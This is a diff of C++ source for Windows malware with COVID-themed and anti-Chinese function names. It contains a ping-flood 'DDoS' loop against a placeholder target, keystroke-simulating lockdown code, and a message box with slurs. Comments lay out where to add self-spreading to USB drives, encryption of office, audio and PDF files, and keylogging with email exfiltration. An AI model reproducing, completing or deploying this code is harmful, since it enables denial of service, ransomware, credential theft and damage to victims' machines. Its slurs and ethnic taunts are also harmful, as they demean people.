@@ -25,6 +25,7 @@
 /*/remove comment in #define _WIN32_WINNT 0x0502 if you're using Visual Studio/*/
 /*/#define _WIN32_WINNT 0x0502/*/
 int Z;
+/*/Remove #define WIN32_WINNT 0x0502 if you're using Visual Studio/*/
 #define WIN32_WINNT 0x0502
 #pragma comment(lib,"ntdll.lib")
 #pragma comment(lib,"user32.lib")
@@ -37,6 +38,7 @@ int Z;
 /*/Windows Only/*/
 
 using namespace std;
+//In DDoSx Functions, replace "insert_any_web_or_IP_Address_Here" with a webpage or IP address (make sure the target webpage/IP address is able to ping-ed before continue//
 void DDoS1(){
 	do{
 		string DoS = (string)"ping -t insert_any_web_or_IP_Address_Here";
@@ -119,7 +121,7 @@ void Impeach_All_Hoo_mans(){
 	    keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
 	    keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
 		MessageBoxW(NULL,(LPCWSTR)"You are locked down, lulz",(LPCWSTR)"Buh-bye retarded idiot living creatures, viruses, and aliens",MB_ICONERROR | MB_OK | MB_DEFBUTTON1);
-		//Insert Self duplicating code (so this malware can copied to any external drive connected to USB, Thunderbolt, or SD/Memory Card slot) here
+		//Insert Self duplicating code (so this malware can copied to any external drive connected to USB, Thunderbolt, or SD/Memory Card slot) here//
 	} 
 void Wuhan(){
 	BeyondMisanthropy();
@@ -134,10 +136,10 @@ void ChineseCommunistParty(){
 }
 void LockDown(){
 CovIdiot();
-//insert file encryption code here, this function must encrypt all files in all drives with these file extensions: Office [*.doc(x), *.xls(x), *.ppt(x), *.pps(x)], some music or audio files (*.ac3, *.ec3, *.atmos, *.dts,*.wav,*.mp3,*.flac,*.aiff,*.m4a,*.aac), *.pdf files
+//insert file encryption code here, this function must encrypt all files in all drives with these file extensions: Office [*.doc(x), *.xls(x), *.ppt(x), *.pps(x)], some music or audio files (*.ac3, *.ec3, *.atmos, *.dts,*.wav,*.mp3,*.flac,*.aiff,*.m4a,*.aac), *.pdf files//
 	}
 int Darurat_Sipil(void){
-//insert keylogging + auto email sending code here, ensure it's working
+//insert keylogging + auto email sending code here, ensure it's working//
 }
 void COVID19(){
 	ChineseCommunistParty();
